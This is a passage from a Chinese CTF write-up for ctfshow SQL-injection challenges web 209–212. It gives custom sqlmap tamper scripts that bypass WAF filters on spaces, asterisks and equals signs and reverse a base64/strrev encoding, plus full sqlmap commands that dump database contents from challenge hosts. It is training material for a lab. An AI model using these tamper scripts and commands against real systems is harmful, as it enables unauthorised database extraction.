</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-209"><a href="#web-209" class="header-anchor">#</a> web 209</h2> <p>前面看别人修改sqlmap的脚本，不知道路径，现在突然想到了。做题需要当场修改脚本到<code>/usr/share/sqlmap/tamper/</code></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>补充：<a href="https://y4er.com/posts/sqlmap-tamper/" target="_blank" rel="noopener noreferrer">【Sqlmap Tamper 编写】<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>
建议跟着做一下，补充能量。</p></div> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">whereis</span> sqlmap <span class="token comment"># 查看sqlmap路径，得到/usr/share/sqlmap</span>
<span class="token function">ls</span> /usr/share/sqlmap/tamper/ <span class="token comment"># 查看tamper所有脚本</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/show-sql/script.png" alt="scripts"></p> <p>这题的sql语句</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;select id,username,pass from ctfshow_user where id = '&quot;</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;' limit 0,1;&quot;</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤preg_match('/ |\*|\=/', $str);空格，星号，等号</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>使用like模糊匹配</p> <p>在tamper目录下写一个脚本<code>show-web209.py</code>，把sqlmap生成的payload里的等号换成like</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot; like &quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库   ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web209.py <span class="token parameter variable">--dbs</span> 

<span class="token comment"># 爆表 ctfshow_flav</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web209.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>

<span class="token comment"># 爆字段 ctfshow_flagx</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5d97db4-7215-457b-b1b5-b61dac84f575.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web209.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flav <span class="token parameter variable">--columns</span> <span class="token parameter variable">-C</span> ctfshow_flagx <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-210"><a href="#web-210" class="header-anchor">#</a> web 210</h2> <p>题目关键处理语句<code>strrev(base64_decode(strrev(base64_decode($id))));</code>，把payload逆向一下，让他处理后得到payload</p> <p>错误示范：</p> <p>base64加密 =》 strrev反转 =》base64加密 =》strrev反转</p> <p>正确：</p> <p>反转 =》 加密 = 》 反转 =》 加密</p> <p>tamper编写，show-web210.py</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>NORMAL

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># 反转 =》 加密 = 》 反转 =》 加密</span>
    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库 ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web210.py <span class="token parameter variable">--dbs</span> 
<span class="token comment"># 爆表 ctfshow_flavi</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 爆字段 ctfshow_flagxx</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavi <span class="token parameter variable">--columns</span>  
<span class="token comment"># 爆数据 </span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://37d82c6d-b413-42dd-a72c-4b7d6aa472e8.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavi <span class="token parameter variable">--columns</span> <span class="token parameter variable">-C</span> ctfshow_flagxx <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-211"><a href="#web-211" class="header-anchor">#</a> web 211</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>在上一题的基础上过滤了空格，sqlmap可以同时使用多个绕过脚本，用逗号<code>,</code>隔开，例如--tamper space2comment.py,show-web210.py</p> <p>在上一题的payload的tamper后使用注释绕过空格的脚本，以及web210的脚本。先使用<code>space2comment.py</code>拿到注释绕过空格的payload，再使用<code>show-web210.py</code>拿到反转加密的payload，拿到最终的payload</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库 ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> space2comment.py,show-web210.py <span class="token parameter variable">--dbs</span> 
<span class="token comment"># 爆表 ctfshow_flavia</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> space2comment.py,show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 爆字段  ctfshow_flagxxa</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> space2comment.py,show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavia <span class="token parameter variable">--columns</span>
<span class="token comment"># 爆金币 &lt;blank&gt;</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://6f592750-f133-43b3-8313-e4fac6493910.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> space2comment.py,show-web210.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavia <span class="token parameter variable">--columns</span> <span class="token parameter variable">-C</span> ctfshow_flagxxa <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-212"><a href="#web-212" class="header-anchor">#</a> web 212</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>相比上题，又过滤了星号<code>*</code>，注释绕过空格用不了了。在前面做题时，已知<code>%0a,%0b,%0c,%0d</code>都可以绕过空格。拿大佬的脚本，整合了绕过空格和编码的功能，写到show-web212.py里待会使用</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
<span class="token keyword">import</span> base64
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW
 
<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token comment"># 主要功能部分</span>
<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">return</span> retVal
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库 ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> show-web212.py <span class="token parameter variable">--dbs</span> 
<span class="token comment"># 爆表 ctfshow_flavis</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> show-web212.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
<span class="token comment"># 爆字段 ctfshow_flagxsa</span>
